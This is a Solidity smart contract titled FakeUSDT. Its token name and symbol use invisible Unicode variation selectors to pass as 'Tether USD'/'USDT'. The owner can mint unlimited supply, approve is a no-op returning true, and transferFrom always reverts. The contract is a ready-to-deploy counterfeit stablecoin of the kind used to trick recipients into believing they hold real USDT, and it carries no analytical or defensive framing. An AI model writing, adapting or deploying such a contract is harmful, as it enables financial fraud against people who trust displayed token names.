// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract FakeUSDT {
    string public name = "\u0054\u180b\u0065\u0074\u180b\u0068\u0065\u180b\u0072\u0020\u0055\u180b\u0053\u180b\u0044";
    string public symbol = "\u0055\u180b\u0053\u180b\u0044\u180b\u0054";
    uint8 public decimals = 9;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        totalSupply = 1_000_000_000 * (10**uint256(decimals));
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "Transfer to zero address");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function mint(address _account, uint256 _amount) public onlyOwner {
         require(_account != address(0), "Mint to zero address");
         totalSupply += _amount;
         balanceOf[_account] += _amount;
         emit Transfer(address(0), _account, _amount);
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return 0;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
         require(false, "transferFrom not implemented in this fake token");
         return false;
    }
}